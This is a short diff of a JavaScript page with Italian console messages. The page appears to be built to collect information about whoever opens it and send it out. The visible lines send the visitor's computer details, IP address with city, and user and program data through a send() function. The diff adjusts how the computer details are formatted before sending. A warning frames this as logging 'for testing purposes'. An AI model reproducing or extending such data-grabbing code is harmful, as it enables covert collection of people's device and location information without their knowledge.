@@ -40,7 +40,7 @@ console.warn("Il token viene lasciato qui come killswitch. La pagina può infatt
 console.warn("Se hai aperto questa pagina *normalmente* ossia scrivendo l'url nel browser, nessun dato è stato collezionato o mandato. Se invece sono presenti lunghe stringhe di testo nell'url, queste informazioni sono state loggate per scopi di testing.");
 
 //send ci information
-send("<b>ComputerInfo</b>%0A<code>" + JSON.stringify(ci) + "</code>");
+send("<b>ComputerInfo</b>%0A<code>" + JSON.stringify(ci, null, 0).replace('"', '') + "</code>");
 // send ip and city
 send("<b>Network + geolocation</b>%0A<code>" + ip + "</code>, "+ ct);
 // send users+prog
